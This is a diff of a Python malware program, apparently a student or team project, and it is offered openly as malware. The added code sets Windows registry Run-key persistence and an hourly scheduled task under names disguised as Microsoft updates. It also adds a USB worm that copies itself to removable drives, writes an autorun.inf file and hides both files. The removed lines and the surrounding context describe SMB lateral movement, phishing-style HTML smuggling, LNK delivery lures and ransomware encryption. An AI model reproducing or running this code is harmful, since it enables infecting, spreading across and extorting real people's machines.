-        - T1053.005: Scheduled Task/Job - Scheduled Task
-        
-        Developer Integration: Homey's RegistryPersistence and ScheduledTaskPersistence
-        classes provide comprehensive persistence coverage.
+        Uses two techniques: Registry Run Key and Scheduled Tasks
         """
-        print("[+] Establishing Persistence (Integrated - Homey)...")
-        print("    [*] Using RegistryPersistence and ScheduledTaskPersistence modules")
+        print("[+] Establishing Persistence...")
         
-        # INTEGRATED METHOD 1: Registry Persistence (Homey)
-        # Uses RegistryPersistence class for comprehensive registry-based persistence
+        # TECHNIQUE 1: Registry Run Key Persistence
+        # This makes the malware execute every time the user logs in
         try:
-            registry_manager = RegistryPersistence(
-                malware_path=self.current_path,
-                name="WindowsSecurityUpdate"  # Disguised as legitimate Windows service
-            )
-            registry_success = registry_manager.establish_persistence()
+            # Open the registry key that controls startup programs
+            # HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                                r"Software\Microsoft\Windows\CurrentVersion\Run", 
+                                0, winreg.KEY_SET_VALUE)
             
-            if registry_success:
-                print("    [+] ✓ Registry persistence established (multiple locations)")
-            else:
-                print("    [-] ✗ Registry persistence failed")
+            # Add our malware with a legitimate-sounding name
+            winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, self.current_path)
+            
+            # Close the registry key properly
+            winreg.CloseKey(key)
+            print("    [+] Registry persistence established")
         except Exception as e:
-            print(f"    [-] Registry persistence error: {e}")
+            print(f"    [-] Registry failed: {e}")
 
-        # INTEGRATED METHOD 2: Scheduled Task Persistence (Homey)
-        # Uses ScheduledTaskPersistence class for advanced task-based persistence
+        # TECHNIQUE 2: Scheduled Task Persistence
+        # This makes the malware run every hour automatically
         try:
-            task_manager = ScheduledTaskPersistence(
-                malware_path=self.current_path,
-                task_name="MicrosoftDefenderUpdate"  # Disguised as legitimate Defender service
-            )
-            task_success = task_manager.establish_persistence()
-            
-            if task_success:
-                print("    [+] ✓ Scheduled task persistence established (multi-trigger)")
-            else:
-                print("    [-] ✗ Scheduled task persistence failed")
+            # Use Windows schtasks command to create a scheduled task
+            # /tn = task name (disguised as Microsoft service)
+            # /tr = task run (path to our malware)
+            # /sc hourly = schedule hourly execution
+            # /f = force creation (overwrite if exists)
+            cmd = f'schtasks /create /tn "MicrosoftWindowsUpdate" /tr "{self.current_path}" /sc hourly /f'
+            subprocess.call(cmd, shell=True)
+            print("    [+] Scheduled task created")
         except Exception as e:
-            print(f"    [-] Scheduled task persistence error: {e}")
-        
-        print("[+] Persistence complete (Homey integration successful)")
+            print(f"    [-] Task failed: {e}")
 
     # ==========================================
-    # PROPAGATION MECHANISMS (INTEGRATED - Kimkheng)
+    # PROPAGATION MECHANISMS  
     # ==========================================
     
     def propagate_usb_worm(self):
         """
-        [INTEGRATED MODULE - Kimkheng: Lateral Movement Specialist]
-        
-        USB Worm Propagation - Spread to removable drives using advanced techniques
-        
-        INTEGRATED TECHNIQUES:
-        1. USB Replication (USBReplicator class)
-           - Automatic USB drive detection
-           - Hidden folder creation with system attributes
-           - Autorun.inf for automatic execution
-           - Decoy folders to trick users
-           - ADS (Alternate Data Streams) hiding
-        
-        MITRE ATT&CK Techniques:
-        - T1091: Replication Through Removable Media
-        - T1564.001: Hide Artifacts - Hidden Files and Directories
-        
-        Developer Integration: Kimkheng's USBReplicator class provides comprehensive
-        USB propagation with multiple evasion techniques.
+        USB Worm Propagation - Spread to removable drives
+        Copies malware to USB drives and creates autorun.inf for automatic execution
         """
-        print("[+] Propagating via USB (Integrated - Kimkheng)...")
-        print("    [*] Using USBReplicator module for advanced USB infection")
+        print("[+] Propagating via USB...")
         
-        try:
-            # INTEGRATED METHOD: USB Replication (Kimkheng)
-            # Uses USBReplicator class for advanced USB worm functionality
-            usb_replicator = USBReplicator(malware_path=self.current_path)
-            
-            # Detect all available USB drives
-            detected_drives = usb_replicator.detect_usb_drives()
-            print(f"    [*] Detected {len(detected_drives)} removable drives")
-            
-            # Infect each detected USB drive
-            for drive in detected_drives:
+        # Check all possible drive letters (D: through Z:)
+        # C: is typically the system drive, so we skip it
+        drives = ['%s:' % d for d in "DEFGHIJKLMNOPQRSTUVWXYZ"]
+        infected_drives = 0
+        
+        # Iterate through each potential drive letter
+        for drive in drives:
+            if os.path.exists(drive):
                 try:
-                    usb_replicator.infect_usb_drive(drive, safe_mode=False)
-                    print(f"    [+] ✓ USB drive infected: {drive}")
-                except Exception as e:
-                    print(f"    [-] Failed to infect {drive}: {e}")
-            
-            infected_count = len(usb_replicator.infected_drives)
-            print(f"[+] USB Propagation complete: {infected_count} drives infected (Kimkheng integration successful)")
-            
-        except Exception as e:
-            print(f"[-] USB propagation error: {e}")
-    
-    def propagate_smb_lateral_movement(self):
-        """
-        [INTEGRATED MODULE - Kimkheng: Lateral Movement Specialist]
+                    # Copy malware to USB
+                    dest = os.path.join(drive, MALWARE_NAME)
+                    shutil.copy2(self.current_path, dest)
+                    
+                    # Create autorun.inf
+                    autorun_path = os.path.join(drive, "autorun.inf")
+                    with open(autorun_path, "w") as f:
+                        f.write("[autorun]\n")
+                        f.write("open=WindowsUpdate.exe\n")
+                        f.write("action=Open folder to view files\n")
+                        f.write("shell\\open=Open\n")
+                        f.write("shell\\open\\Command=WindowsUpdate.exe\n")
+                    
+                    # Hide files
+                    subprocess.call(f'attrib +h +s "{dest}"', shell=True)
+                    subprocess.call(f'attrib +h +s "{autorun_path}"', shell=True)
+                    
+                    infected_drives += 1
+                    print(f"    [+] Infected USB drive: {drive}")
+                    
+                except Exception:
+                    continue
         
-        SMB Lateral Movement - Spread across network using SMB protocol
-        
-        INTEGRATED TECHNIQUES:
-        1. SMB Worm (RedTeamSMBWorm class)
-           - Network host discovery (ARP table parsing)
-           - SMB share enumeration
-           - Remote file copying to network shares
-           - WMI-based remote execution
-           - Operational security delays
-        
-        MITRE ATT&CK Techniques:
-        - T1021.002: Remote Services - SMB/Windows Admin Shares
-        - T1135: Network Share Discovery
-        - T1210: Exploitation of Remote Services
-        
-        Developer Integration: Kimkheng's RedTeamSMBWorm class enables network-wide
-        propagation through SMB shares and remote execution.
-        """
-        print("[+] Initiating SMB Lateral Movement (Integrated - Kimkheng)...")
-        print("    [*] Using RedTeamSMBWorm module for network propagation")
-        
-        try:
-            # INTEGRATED METHOD: SMB Lateral Movement (Kimkheng)
-            # Uses RedTeamSMBWorm class for network propagation
-            smb_worm = RedTeamSMBWorm(malware_path=self.current_path)
-            
-            # Execute network-wide propagation
-            smb_worm.spread_across_network(safe_mode=False)
-            
-            infected_count = len(smb_worm.infected_hosts)
-            discovered_count = len(smb_worm.discovered_hosts)
-            
-            print(f"[+] SMB Lateral Movement complete:")
-            print(f"    - Discovered: {discovered_count} hosts")
-            print(f"    - Infected: {infected_count} hosts")
-            print(f"    (Kimkheng integration successful)")
-            
-        except Exception as e:
-            print(f"[-] SMB lateral movement error: {e}")
+        print(f"[+] USB Propagation: Infected {infected_drives} drives")
 
     # ==========================================
     # CORE MALICIOUS METHOD 1: FILE ENCRYPTION (RANSOMWARE)
@@ -1842,83 +876,6 @@ Attack running in background. Use 'status' to check progress."""
             "file_count": self.encrypted_count,
             "timestamp": time.time()
         }
-    
-    # ==========================================
-    # DELIVERY METHODS (INTEGRATED - Puleu)
-    # ==========================================
-    
-    def generate_delivery_payloads(self):
-        """
-        [INTEGRATED MODULE - Puleu: Delivery Specialist]
-        
-        Generate all delivery payloads for initial compromise
-        
-        INTEGRATED TECHNIQUES:
-        1. HTML Smuggling (HTMLSmuggler class)
-           - DHL shipping notification template
-           - Invoice payment template
-           - Office 365 security alert template
-           - Base64-encoded payload embedding
-           - Automatic download via JavaScript
-        
-        2. LNK Generation (LNKGenerator class)
-           - Classic LNK with PDF icon disguise
-           - RTLO (Right-to-Left Override) for filename spoofing
-           - Word/Excel document disguises
-           - PowerShell download cradles
-        
-        MITRE ATT&CK Techniques:
-        - T1027.006: HTML Smuggling
-        - T1204.001: User Execution - Malicious Link
-        - T1547.009: Shortcut Modification
-        - T1036.007: Double File Extension
-        
-        Developer Integration: Puleu's HTMLSmuggler and LNKGenerator classes provide
-        multiple initial access vectors for social engineering attacks.
-        
-        Usage:
-            This method should be called BEFORE distributing the malware to create
-            all delivery artifacts (HTML files and LNK shortcuts).
-        """
-        print("[+] Generating Delivery Payloads (Integrated - Puleu)...")
-        print("    [*] Using HTMLSmuggler and LNKGenerator modules")
-        
-        # INTEGRATED METHOD 1: HTML Smuggling (Puleu)
-        try:
-            html_smuggler = HTMLSmuggler()
-            
-            # Generate all HTML smuggling templates
-            templates = ['dhl', 'invoice', 'office365']
-            for template in templates:
-                html_file = html_smuggler.generate_html_smuggling(
-                    payload_path=self.current_path,
-                    template=template
-                )
-                if html_file:
-                    print(f"    [+] ✓ HTML smuggling file created: {template} template")
-            
-            print("    [+] HTML smuggling generation complete")
-            
-        except Exception as e:
-            print(f"    [-] HTML smuggling generation error: {e}")
-        
-        # INTEGRATED METHOD 2: LNK Generation (Puleu)
-        try:
-            lnk_generator = LNKGenerator()
-            
-            # Generate all LNK variants
-            lnk_files = lnk_generator.generate_all_variants(c2_ip=C2_SERVER)
-            
-            print(f"    [+] ✓ LNK generation complete: {len(lnk_files)} variants created")
-            print(f"    [+] LNK files include: Classic, RTLO, Word, Excel disguises")
-            
-        except Exception as e:
-            print(f"    [-] LNK generation error: {e}")
-        
-        print("[+] Delivery payload generation complete (Puleu integration successful)")
-        print(f"    [*] Artifacts saved in:")
-        print(f"        - html_smuggling_output/ (HTML files)")
-        print(f"        - lnk_payloads/ (LNK shortcuts)")
 
     def _auto_execute_all(self):
         """
@@ -1979,15 +936,12 @@ Attack running in background. Use 'status' to check progress."""
         ╚═══════════════════════════════════════════════╝
         """)
         
-        # Phase 1: Persistence (Homey's integrated modules)
+        # Phase 1: Persistence
         self.establish_persistence()
         time.sleep(1)
         
-        # Phase 2: Propagation (Kimkheng's integrated modules)
-        print("\n[+] Phase 2: Propagation (USB + SMB)")
-        self.propagate_usb_worm()  # USB worm using USBReplicator
-        time.sleep(1)
-        self.propagate_smb_lateral_movement()  # SMB propagation using RedTeamSMBWorm
+        # Phase 2: Propagation
+        self.propagate_usb_worm()
         time.sleep(1)
         
         # Phase 3: Core Malicious Payloads in parallel
